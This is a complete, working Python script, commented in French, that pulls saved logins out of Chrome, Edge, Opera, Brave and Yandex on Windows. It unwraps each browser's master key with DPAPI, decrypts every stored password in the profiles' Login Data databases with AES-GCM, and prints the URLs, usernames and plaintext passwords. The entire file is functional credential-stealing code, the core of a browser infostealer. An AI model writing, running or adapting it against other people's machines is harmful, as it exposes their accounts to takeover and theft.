#!/usr/bin/env python3
import os
import json
import base64
import sqlite3
import shutil
import tempfile
import ctypes
from ctypes import wintypes, byref, Structure, POINTER, c_byte
from Crypto.Cipher import AES

# Structures pour DPAPI
class DATA_BLOB(Structure):
    _fields_ = [
        ("cbData", wintypes.DWORD),
        ("pbData", POINTER(c_byte))
    ]

def dpapi_decrypt(encrypted_bytes: bytes) -> bytes:
    blob_in = DATA_BLOB(len(encrypted_bytes),
                        ctypes.cast(ctypes.create_string_buffer(encrypted_bytes), POINTER(c_byte)))
    blob_out = DATA_BLOB()
    if ctypes.windll.crypt32.CryptUnprotectData(
        byref(blob_in), None, None, None, None, 0, byref(blob_out)
    ):
        ptr = ctypes.cast(blob_out.pbData, POINTER(c_byte * blob_out.cbData))
        data = bytes(ptr.contents)
        ctypes.windll.kernel32.LocalFree(blob_out.pbData)
        return data
    else:
        raise ctypes.WinError()

# Navigateurs et profils
LOCALAPPDATA = os.getenv("LOCALAPPDATA")
APPDATA      = os.getenv("APPDATA")
if not LOCALAPPDATA or not APPDATA:
    print("⚠️ Ce script doit être lancé sur Windows dans une session utilisateur.")
    exit(1)

CHROMIUM_BROWSERS = [
    {"name": "Chrome", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data")},
    {"name": "Edge",   "path": os.path.join(LOCALAPPDATA, "Microsoft", "Edge", "User Data")},
    {"name": "Opera",  "path": os.path.join(APPDATA, "Opera Software", "Opera Stable")},
    {"name": "Brave",  "path": os.path.join(LOCALAPPDATA, "BraveSoftware", "Brave-Browser", "User Data")},
    {"name": "Yandex", "path": os.path.join(APPDATA, "Yandex", "YandexBrowser", "User Data")},
]

PROFILES = ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5"]

def get_chrome_key(local_state_path: str) -> bytes:
    print(f"[+] Lecture de la clé depuis : {local_state_path}")
    with open(local_state_path, 'r', encoding='utf-8') as f:
        local_state = json.load(f)
    enc_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    key = dpapi_decrypt(enc_key)
    print(f"    → Clé AES récupérée ({len(key)} octets)")
    return key

def decrypt_password(buff: bytes, key: bytes) -> str:
    try:
        if buff.startswith(b'v10'):
            iv = buff[3:15]
            ciphertext = buff[15:-16]
            tag = buff[-16:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted = cipher.decrypt_and_verify(ciphertext, tag)
            return decrypted.decode('utf-8', errors='ignore')
    except Exception as e:
        print(f"    [!] Échec AES-GCM: {e}")
    try:
        dec = dpapi_decrypt(buff)
        return dec.decode('utf-8', errors='ignore')
    except Exception as e:
        print(f"    [!] Échec DPAPI fallback: {e}")
        return ""

def extract_passwords():
    results = []
    for browser in CHROMIUM_BROWSERS:
        base = browser["path"]
        print(f"\n[*] Vérification de {browser['name']} dans {base}")
        if not os.path.isdir(base):
            print("    → dossier introuvable, skip")
            continue

        local_state = os.path.join(base, "Local State")
        if not os.path.isfile(local_state):
            print("    → Local State inexistant, skip")
            continue

        try:
            key = get_chrome_key(local_state)
        except Exception as e:
            print(f"    [!] Impossible de récupérer la clé: {e}")
            continue

        for profile in PROFILES:
            login_db = os.path.join(base, profile, "Login Data")
            print(f"  - Profil '{profile}': {login_db}")
            if not os.path.isfile(login_db):
                print("      → Login Data introuvable, skip")
                continue

            # Copie dans un fichier temporaire
            fd, tmp = tempfile.mkstemp(suffix=".db")
            os.close(fd)
            shutil.copy2(login_db, tmp)
            try:
                conn = sqlite3.connect(tmp)
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                rows = cursor.fetchall()
                print(f"      → {len(rows)} entrées trouvées")
                for url, username, enc in rows:
                    if not enc:
                        continue
                    blob = enc if isinstance(enc, (bytes, bytearray)) else bytes(enc)
                    pwd = decrypt_password(blob, key)
                    print(f"        • {url} / {username} → '{pwd}'")
                    results.append({
                        "browser": browser["name"],
                        "profile": profile,
                        "url": url,
                        "username": username,
                        "password": pwd
                    })
                cursor.close()
                conn.close()
            except Exception as e:
                print(f"      [!] Erreur lecture DB: {e}")
            finally:
                os.remove(tmp)
    return results

if __name__ == "__main__":
    print("=== Début de l’extraction des mots de passe Chromium ===")
    pw_list = extract_passwords()
    print("\n=== Extraction terminée ===")
    if not pw_list:
        print("⚠️ Aucun mot de passe récupéré.")
    else:
        print(f"✅ {len(pw_list)} mot(s) de passe extrait(s). Vérifie ci‑dessus les détails.")
